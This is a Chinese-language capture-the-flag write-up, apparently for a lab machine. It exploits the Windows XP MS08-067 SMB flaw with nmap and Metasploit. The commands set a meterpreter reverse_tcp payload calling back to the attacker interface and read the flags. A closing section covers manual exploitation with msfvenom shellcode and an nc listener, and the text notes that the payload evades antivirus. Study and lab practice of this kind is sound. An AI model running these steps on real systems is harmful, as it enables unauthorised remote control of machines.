## 1. 信息搜集与侦察 (Enumeration)

* **端口与服务扫描**
    * 执行指令：`nmap -sC -sV -Pn 10.129.33.194`
    * 核心发现：开放 `135` (RPC), `139` (NetBIOS), `445` (SMB)。系统版本暴露为 Windows XP。

* **为什么（底层机制）**：使用 `-Pn` 参数是应对 Windows 系统默认防火墙拦截 ICMP 请求（禁 Ping）的核心策略。若不强制跳过主机发现阶段，Nmap 会误判目标已离线而终止 TCP 扫描。
* **注意什么（实战避坑）**：当跨越隔离网络进行扫描时，如果出现 `Destination Host Unreachable`，必须优先排查底层路由连通性（如 VPN 网关是否挂载在正确的靶场环境），切忌将其与目标机的应用层防火墙拦截相混淆。

## 2. 漏洞分析与利用 (Exploitation)

* **核心漏洞**：MS08-067 (CVE-2008-4250)
* **为什么（底层机制）**：Windows Server 服务在处理恶意 RPC (远程过程调用) 请求时存在**路径规范化缺陷 (Path Canonicalization)**。通过向开放的 445 端口发送精心构造的畸形流量，可直接触发内存缓冲区溢出 (Buffer Overflow)。由于 SMB/RPC 服务运行在操作系统的最高层级，溢出后执行的恶意代码将直接继承 `NT AUTHORITY\SYSTEM` 的上帝权限。
* **武器化执行 (Metasploit)**
    * 载入模块：`use exploit/windows/smb/ms08_067_netapi`
    * 锁定靶机：`set RHOSTS 10.129.33.194`
    * 设定回传网卡：`set LHOST tun0`
    * 挂载控制载荷：`set payload windows/meterpreter/reverse_tcp`
* **为什么选择 Reverse TCP（反向连接）**：真实企业内网普遍部署严密的入站防火墙，阻断外部 IP 主动连接内部端口。反向连接利用目标网络“出站管控相对宽松”的弱点，让靶机主动向攻击者的控制端（VPN IP）发起 TCP 连接，实现底层流量的无感穿透。

## 3. 后渗透与凭证提取 (Post-Exploitation)

* **Meterpreter 载荷特征**
    * **为什么（底层机制）**：成功执行获取的 Meterpreter Shell 属于典型的**无文件 (Fileless) 攻击**载荷。它将自身代码直接注入并驻留在目标系统的进程内存中，不在物理硬盘上生成真实的 `.exe` 文件。这种运行机制能绕过绝大多数传统防病毒软件 (AV) 的静态特征扫描，且极大地增加了数字取证的追踪难度。
* **目录遍历与 Flag 提取**
    * User Flag 提取：`type "C:\Documents and Settings\john\Desktop\user.txt"`
    * Root Flag 提取：`type "C:\Documents and Settings\Administrator\Desktop\root.txt"`
* **注意什么（实战避坑）**：在传统的 Windows CMD 环境下进行目录跳转操作时，若目标路径中包含空格字符（如 `Documents and Settings`），必须使用英文双引号包裹完整绝对路径。否则，系统的命令行解释器会将空格误判为多个独立参数的分隔符，直接引发“找不到指定路径”的语法报错。

## 4. 高级延伸技巧 (OSCP 实战要求)

* **脱离自动化框架 (Manual Exploitation)**：在严禁使用 Metasploit 的实战审计或 OSCP 考试环境中，必须具备纯手工利用该漏洞的能力：
    1.  从 Exploit-DB 等漏洞库获取基于 Python 或 C 语言的 MS08-067 原始 POC 脚本。
    2.  利用 `msfvenom` 手工编译无坏字符的自定义 Shellcode。
    3.  对脚本源码进行逆向修改，替换精确的内存偏移地址与执行载荷。
    4.  本地拉起 `nc -lvnp <端口>` 开启静默监听，运行脚本完成物理层面的反弹 Shell 闭环。
